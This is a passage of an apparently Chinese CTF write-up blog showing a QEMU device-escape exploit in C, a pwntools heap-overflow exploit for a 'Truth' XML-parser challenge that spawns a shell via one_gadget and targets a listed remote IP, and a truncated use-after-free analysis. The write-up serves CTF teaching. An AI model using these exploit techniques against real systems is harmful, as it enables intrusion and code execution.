</span><br><span class="line">    v[<span class="number">0</span>]=v0; v[<span class="number">1</span>]=v1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">  system( <span class="string">&quot;mknod -m 660 /dev/mem c 1 1&quot;</span> );</span><br><span class="line"></span><br><span class="line">  mmio_mem = mem_map(<span class="string">&quot;/dev/mem&quot;</span>, mmio_addr, mmio_size);</span><br><span class="line">  <span class="keyword">if</span> (!mmio_mem)&#123;</span><br><span class="line">      die(<span class="string">&quot;mmio or vga mmap failed&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;get process address\n&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span>(iopl(<span class="number">3</span>)!=<span class="number">0</span>)&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;iopl 3 failed\n&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  pmio_write(<span class="number">4</span>, <span class="number">0</span>);</span><br><span class="line">  pmio_write(<span class="number">8</span>, <span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">uint32_t</span> res[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">  res[<span class="number">0</span>] = mmio_read(<span class="number">3</span> &lt;&lt; <span class="number">3</span>, <span class="number">2</span>);</span><br><span class="line">  res[<span class="number">1</span>] = mmio_read(<span class="number">3</span> &lt;&lt; <span class="number">3</span>, <span class="number">2</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%p %p\n&quot;</span>, res[<span class="number">0</span>], res[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="type">uint32_t</span>  key[<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  my_tea_decrypt(res, key);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%p %p\n&quot;</span>, res[<span class="number">0</span>], res[<span class="number">1</span>]);</span><br><span class="line">  <span class="type">uint64_t</span> randr_address = ((<span class="type">uint64_t</span> )res[<span class="number">1</span>]) &lt;&lt; <span class="number">32</span>;</span><br><span class="line">  randr_address += res[<span class="number">0</span>];</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;rand address is %p\n&quot;</span>, randr_address);</span><br><span class="line"></span><br><span class="line">  <span class="type">uint64_t</span> libc_address = randr_address - <span class="number">0x4aeb0</span>;</span><br><span class="line">  <span class="type">uint64_t</span> system_address = libc_address + <span class="number">0x55410</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;system address is %p\n&quot;</span>, system_address);</span><br><span class="line"></span><br><span class="line">  res[<span class="number">0</span>] = system_address &amp; <span class="number">0xffffffff</span>;</span><br><span class="line">  res[<span class="number">1</span>] = system_address &gt;&gt; <span class="number">32</span>;</span><br><span class="line">  my_tea_encrypt(res, key);</span><br><span class="line">  <span class="type">uint64_t</span> en_system_address = ((<span class="type">uint64_t</span> )res[<span class="number">1</span>]) &lt;&lt; <span class="number">32</span>;</span><br><span class="line">  en_system_address += res[<span class="number">0</span>];</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;enc system address is %p\n&quot;</span>, en_system_address);</span><br><span class="line">  getchar();</span><br><span class="line">  mmio_write(<span class="number">3</span> &lt;&lt; <span class="number">3</span>, en_system_address, <span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">  res[<span class="number">1</span>] = <span class="number">0x67616c66</span>;</span><br><span class="line">  res[<span class="number">0</span>] = <span class="number">0x20746163</span>;</span><br><span class="line">  my_tea_encrypt(res, key);</span><br><span class="line">  <span class="type">uint64_t</span> enc_sh = ((<span class="type">uint64_t</span> )res[<span class="number">1</span>]) &lt;&lt; <span class="number">32</span>;</span><br><span class="line">  enc_sh += res[<span class="number">0</span>];</span><br><span class="line">  pmio_write(<span class="number">8</span>, <span class="number">0</span>);</span><br><span class="line">  mmio_write(<span class="number">0</span>, enc_sh , <span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">  pmio_write(<span class="number">0x1c</span>, <span class="number">0x2620736c</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Truth"><a href="#Truth" class="headerlink" title="Truth"></a>Truth</h2><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p>直接给出了源代码，程序提供了四种功能</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">menu();</span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; choice;</span><br><span class="line"><span class="keyword">switch</span> (choice)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line"><span class="type">char</span> temp;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Please input file&#x27;s content&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">while</span> (read(STDIN_FILENO, &amp;temp, <span class="number">1</span>) &amp;&amp; temp != <span class="string">&#x27;\xff&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">xmlContent.push_back(temp);</span><br><span class="line">&#125;</span><br><span class="line">xmlfile.parseXml(xmlContent);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Please input the node name which you want to edit&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; nodeName &gt;&gt; content;</span><br><span class="line">xmlfile.editXML(nodeName, content);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">pnode(*xmlfile.node-&gt;begin(), <span class="string">&quot;&quot;</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;MEME&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; nodeName;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">auto</span> temp = pnode(*xmlfile.node-&gt;begin(), <span class="string">&quot;&quot;</span>, nodeName)) </span><br><span class="line">temp-&gt;meme(temp-&gt;backup);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里大致说一下，首先是<code>parseXML</code>函数，函数会根据<code>xml</code>的格式依次递归解析，每个标签都是一个<code>node</code>，用结构体<code>XML_NODE</code>来进行表示。在<code>parse</code>过程中最值得注意的就是<code>XML_NODE::parseNodeContents</code>中的处理逻辑</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (*current)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">switch</span> (*current)</span><br><span class="line">&#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        case CHARACTACTERS::LT:</span></span><br><span class="line"><span class="comment">        case CHARACTACTERS::NEWLINE:</span></span><br><span class="line"><span class="comment">case CHARACTACTERS::BLANK:</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">auto</span> lt = iterFind(current, CHARACTACTERS::LT);</span><br><span class="line">data = <span class="built_in">std</span>::make_shared &lt;<span class="built_in">std</span>::<span class="built_in">string</span>&gt;(current, lt);</span><br><span class="line">backup = (<span class="type">char</span>*)<span class="built_in">malloc</span>(<span class="number">0x50</span>);</span><br><span class="line">current = lt;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该函数在处理完标签的左半部分的时候发生调用如果没有遇到上述的三种情况也就是<code>&lt;</code>，<code>\n</code>，空格三种字符的情况下就会进行堆块的分配，这里共分配了两个堆块，第一个我称之为<code>content</code>堆块，该堆块的大小由当前字符到最近的一个<code>&lt;</code>之间的距离决定，第二个是固定的堆块为<code>backup</code>。</p><p>接下来看一下<code>edit</code>函数，首先根据用户输入的名称找到对应的<code>Node</code>结构体，接着检查了<code>node-&gt;data</code>中的字符的长度</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span>* <span class="title function_">XML_NODE::isInsertable</span><span class="params">(<span class="type">int</span> x)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (x &gt; <span class="number">0x50</span> || x &lt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> nullptr;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> backup;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>即需要小于<code>0x50</code>，接着就会将<code>data</code>中的数据拷贝到<code>backup</code>中，并将<code>data</code>更新为用户输入的<code>content</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; a-&gt;data-&gt;length(); i++)</span><br><span class="line">&#123;</span><br><span class="line">  a-&gt;backup[i] = (*a-&gt;data)[i];</span><br><span class="line">&#125;</span><br><span class="line">*(a-&gt;data) = content;</span><br></pre></td></tr></table></figure><p>接着看一下第三个功能也就是<code>show</code>函数，这里通过<code>pnode</code>函数打印出了用户指定的<code>Node</code>结构体的内容，包含<code>xml</code>中的属性字段以及<code>data</code>。</p><p>接着就是最后一个函数，类似于一个后门函数，调用了结构体中的一个函数指针，打印出了<code>backup</code>的内容</p><h3 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h3><p>这里可能是优化导致的问题，<code>edit</code>函数中的针对<code>data</code>的长度检查失效了，导致用户针对<code>backup</code>可以任意长度的堆溢出。而从调试中我们可以发现如果我们输入下面的<code>XML</code>，<code>backup</code>堆块相邻的位置存在一个<code>node</code>结构体</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Lin</span> <span class="attr">1</span>=<span class="string">&quot;111&quot;</span>&gt;</span></span><br><span class="line">  data</span><br><span class="line"><span class="tag">&lt;<span class="name">Lin2</span>&gt;</span></span><br><span class="line">/bin/sh</span><br><span class="line"><span class="tag">&lt;/<span class="name">Lin2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Lin</span>&gt;</span></span><br></pre></td></tr></table></figure><p>也就是<code>backup</code>堆块与<code>Lin2</code>结构体相邻。这里我们就可以直接覆写结构体了，一个<code>Node</code>结构体的布局如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">30</span>gx <span class="number">0xab0c30</span><span class="number">-0x20</span></span><br><span class="line"><span class="number">0xab0c10</span>:       <span class="number">0x0000000000000000</span>      <span class="number">0x00000000000000a1</span></span><br><span class="line"><span class="number">0xab0c20</span>:       <span class="number">0x00000000004054e0</span>      <span class="number">0x0000000100000002</span></span><br><span class="line"><span class="number">0xab0c30</span>:       <span class="number">0x0000000000405340</span>（meme函数指针存储地址）      <span class="number">0x0000000000ab0c48</span> 堆地址</span><br><span class="line"><span class="number">0xab0c40</span>:       <span class="number">0x0000000000000003</span>      <span class="number">0x00007fff006e694c</span></span><br><span class="line"><span class="number">0xab0c50</span>:       <span class="number">0x00007fffec193a00</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0xab0c60</span>:       <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000ab11d0</span></span><br><span class="line"><span class="number">0xab0c70</span>:       <span class="number">0x0000000000ab11d0</span>      <span class="number">0x0000000000ab11d0</span></span><br><span class="line"><span class="number">0xab0c80</span>:       <span class="number">0x0000000000000001</span>      <span class="number">0x0000000000ab0e40</span></span><br><span class="line"><span class="number">0xab0c90</span>:       <span class="number">0x0000000000ab0e30</span>      <span class="number">0x0000000000ab1390</span></span><br><span class="line"><span class="number">0xab0ca0</span>:       <span class="number">0x0000000000ab1380</span>      <span class="number">0x0000000000ab0f00</span>(backup)</span><br></pre></td></tr></table></figure><p>根据结构体中的指针泄漏得到<code>heap address</code>，接着覆写结构体中的函数指针，利用第四个函数<code>getshell</code>。</p><p>这里还差一个<code>libc</code>基地址的泄露。这里也可以根据<code>backup</code>得到，在<code>data = std::make_shared &lt;std::string&gt;(current, lt);</code>语句执行完毕之后会产生一个和<code>data</code>大小相同的堆块，如果此堆块为<code>unsorted bin</code>，那么我们可以直接通过打印<code>backup</code>来泄漏得到<code>libc</code>基地址。</p><p>在将函数指针覆写为<code>gadget</code>的时候遇到了一个问题就是所有的<code>gadget</code>都无法实现，但是经过调试发现<code>rsp+0x60</code>（这里对应的<code>gadget</code>的条件是<code>rsp+0x70=NULL</code>，环境变量的参数，由于<code>call</code>会压入返回地址因此是<code>0x68</code>）部分存储的是<code>Node</code>的名称，一共是<code>0x10</code>子节，也就是<code>rsp+0x68</code>部分存储的是<code>Node</code>名称的后半段，是一个非法的地址，需要注意的是这里的<code>rsp+0x70=NULL</code>并不一定要求该位置一定为<code>NULL</code>而是一个合法的指针数组即可（数组起始到结束包含的指针均合法，并且以<code>NULL</code>结尾）</p><p>因此这里可以将<code>Node</code>的名称缩短至四子节，使得<code>rsp+0x68=NULL</code>，也就是<code>gadget</code>执行的时候<code>rsp+0x70=NULL</code>，从而成功执行<code>execve</code>。</p><h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">file_path = <span class="string">&quot;./Truth&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">elf = ELF(file_path)</span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process([file_path])</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">    one_gadget = [<span class="number">0x45226</span>, <span class="number">0x4527a</span>, <span class="number">0xf0364</span>, <span class="number">0xf1207</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;106.14.216.214&#x27;</span>, <span class="number">45116</span>)</span><br><span class="line">    libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line">    one_gadget = [<span class="number">0x45226</span>, <span class="number">0x4527a</span>, <span class="number">0xf0364</span>, <span class="number">0xf1207</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parse</span>(<span class="params">file_content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Choice: &quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.sendafter(<span class="string">&quot;file&#x27;s content\n&quot;</span>, file_content)</span><br><span class="line">    p.sendline(<span class="string">&quot;\xff&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">name, content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Choice: &quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;to edit\n&quot;</span>, name)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Choice: &quot;</span>, <span class="string">&quot;3&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show_backup</span>(<span class="params">name</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Choice: &quot;</span>, <span class="string">&quot;4&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;MEME&quot;</span>, name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">file_content = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&lt;?xml?&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;Lin 1=&quot;&#123;&#125;&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;Lin2&gt;</span></span><br><span class="line"><span class="string">/bin/sh</span></span><br><span class="line"><span class="string">&lt;/Lin2&gt;</span></span><br><span class="line"><span class="string">&lt;Lin3&gt;</span></span><br><span class="line"><span class="string">/bin/sh</span></span><br><span class="line"><span class="string">&lt;/Lin3&gt;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(<span class="string">&quot;a&quot;</span>*<span class="number">0x500</span>)</span><br><span class="line">file_content += <span class="string">&quot;a&quot;</span> * <span class="number">0x70</span> + <span class="string">&quot;b&quot;</span>*<span class="number">0x7</span></span><br><span class="line">file_content += <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&lt;Lin4&gt;</span></span><br><span class="line"><span class="string">/bin/sh</span></span><br><span class="line"><span class="string">&lt;/Lin4&gt;</span></span><br><span class="line"><span class="string">&lt;/Lin&gt;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">parse(file_content)</span><br><span class="line">show_backup(<span class="string">&quot;Lin&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Useless&quot;</span>)</span><br><span class="line">libc.address = u64(p.recvline().strip().ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>)) - <span class="number">88</span> - <span class="number">0x10</span> - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&quot;libc address is &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc.address)))</span><br><span class="line"></span><br><span class="line">edit(<span class="string">&quot;Lin&quot;</span>, <span class="string">&quot;1212&quot;</span>)</span><br><span class="line">show_backup(<span class="string">&quot;Lin&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;b&quot;</span> * <span class="number">0x7</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">heap_address = u64(p.recvline().strip().ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">log.success(<span class="string">&quot;heap address is &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(heap_address)))</span><br><span class="line"></span><br><span class="line">edit(<span class="string">&quot;Lin3&quot;</span>, <span class="string">b&quot;/bin/sh\x00&quot;</span> + p64(one_gadget[<span class="number">3</span>] + libc.address))</span><br><span class="line">edit(<span class="string">&quot;Lin3&quot;</span>, <span class="string">b&quot;/bin/sh\x00&quot;</span> + p64(one_gadget[<span class="number">3</span>] + libc.address))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span>*<span class="number">0x70</span> + p64(heap_address- <span class="number">0x1e0</span>)</span><br><span class="line">edit(<span class="string">&quot;Lin&quot;</span>, payload)</span><br><span class="line">edit(<span class="string">&quot;Lin&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">show_backup(<span class="string">&quot;Lin4&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="狡兔三窟"><a href="#狡兔三窟" class="headerlink" title="狡兔三窟"></a>狡兔三窟</h2><h3 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h3><p>是个<code>cpp</code>的<code>pwn</code>，首先看一下<code>ida</code>，程序中包含两个重要的结构体如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000</span> total_node      struc ; (<span class="keyword">sizeof</span>=<span class="number">0x18</span>, mappedto_13)</span><br><span class="line"><span class="number">00000000</span> note1           dq ?</span><br><span class="line"><span class="number">00000008</span> note2           dq ?</span><br><span class="line"><span class="number">00000010</span> backup          dq ?</span><br><span class="line"><span class="number">00000018</span> total_node      ends</span><br><span class="line"><span class="number">00000018</span></span><br><span class="line"><span class="number">00000000</span> ; ---------------------------------------------------------------------------</span><br><span class="line"><span class="number">00000000</span></span><br><span class="line"><span class="number">00000000</span> node            struc ; (<span class="keyword">sizeof</span>=<span class="number">0x28</span>, mappedto_14)</span><br><span class="line"><span class="number">00000000</span> func_ptr        dq ?</span><br><span class="line"><span class="number">00000008</span> is_cleared      dq ?</span><br><span class="line"><span class="number">00000010</span> vector_start    dq ?</span><br><span class="line"><span class="number">00000018</span> vector_current  dq ?</span><br><span class="line"><span class="number">00000020</span> vector_end      dq ?</span><br><span class="line"><span class="number">00000028</span> node            ends</span><br></pre></td></tr></table></figure><p><code>total_node</code>的结构体对应的是<code>NoteStorageImpl</code>，<code>node</code>结构体对应的是<code>NoteImpl</code>，其中<code>total_node</code>中的每一个<code>node</code>是<code>node</code>结构体的一个实例，<code>backup</code>包含两个成员变量，其中第一个表明<code>node</code>是否被删除，第二个成员变量指向一个<code>note</code>结构体。</p><p>程序一共提供了六种功能，首先看一下<code>editHouse</code>，首先判断<code>note1</code>是否被删除（通过<code>bool</code>函数判断），如果被删除则针对<code>note2</code>调用<code>add</code>函数，<code>add</code>函数首先会判断用户是否会调用<code>clear</code>，该函数只能调用一次，作用就是将<code>vector_current</code>指针指向<code>vector_start</code>即指向<code>vector</code>的开头。接着将用户输入的内容压入<code>vector</code>，空间扩展操作和<code>vector</code>类似，如果空间不够即<code>vector_end == vector_curret</code>则申请两倍大小的空间（这里的两倍的大小是根据<code>vector_end-vector_current</code>计算的），释放原始空间。</p><p>接着是<code>save_house</code>，函数实际上调用的是<code>shrik_to_fit</code>函数，函数的作用就是缩小<code>vector</code>的内存空间。会申请一个<code>vecotr_current-vector_start</code>大小的内存空间，将<code>vector</code>中的内容拷贝之后释放原空间，并将<code>vector_end=vector_current</code>，也就是说下一次<code>push</code>的时候会触发<code>vector</code>的扩容。</p><p>接着就是<code>backup</code>函数，该函数只能针对<code>note1</code>进行备份。也就是第二个成员变量指向<code>note1</code></p><p>接着就是<code>encourage</code>函数，该函数如果判断<code>note1</code>被删除了之后，会调用<code>backup</code>中指向的<code>note</code>结构体的<code>func_ptr</code>即函数指针</p><p>接着就是<code>delHouse</code>函数，函数的作用是删除<code>note</code>，但是只能在<code>backup</code>调用之后针对<code>note1</code>进行删除。删除会清空<code>total_note</code>中的<code>note1</code>指针，释放<code>note</code>结构体，该结构体的大小为<code>0x350</code>。</p><p>最后就是<code>show</code>函数，函数会打印<code>backup</code>结构体中的<code>note</code>指针指向的结构体的第一个成员变量也就是函数指针的内容，但是需要注意的是这里<code>show</code>函数也是需要<code>note1</code>删除之后才能进行调用的。</p><h3 id="利用-2"><a href="#利用-2" class="headerlink" title="利用"></a>利用</h3><p>漏洞是一个<code>UAF</code>，由处理逻辑导致的，即<code>show</code>和<code>encourage</code>函数会经过<code>backup</code>处理删除之后的<code>note1</code>的结构体堆块。</p><p>首先考虑的就是<code>show</code>函数的调用导致的信息泄漏，正常情况下删除<code>note</code>结构体的时候，结构体所在的堆块会存储到<code>tcache</code>中，第一个成员变量会被覆写为<code>0</code>，也就是说再调用<code>show</code>函数无法输出任何的东西。并且我们无法任意次数的释放指定大小的堆块，因此无法通过这个堆块泄漏出<code>libc</code>地址。</p><p>只能首先释放一个<code>0x350</code>大小的结构体，之后再删除<code>note</code>结构体，从而泄漏出堆地址。这里采用的释放指定大小的堆块的方式是通过<code>shrik_to_fit</code>函数和<code>vector</code>的两次扩容实现的。假设我们要释放<code>size</code>大小的堆块，那么首先<code>add((size-0x10)/2)</code>，再调用<code>shrik_to_fit</code>函数，此时堆块的大小就会缩减为<code>(size-0x10)/2 + 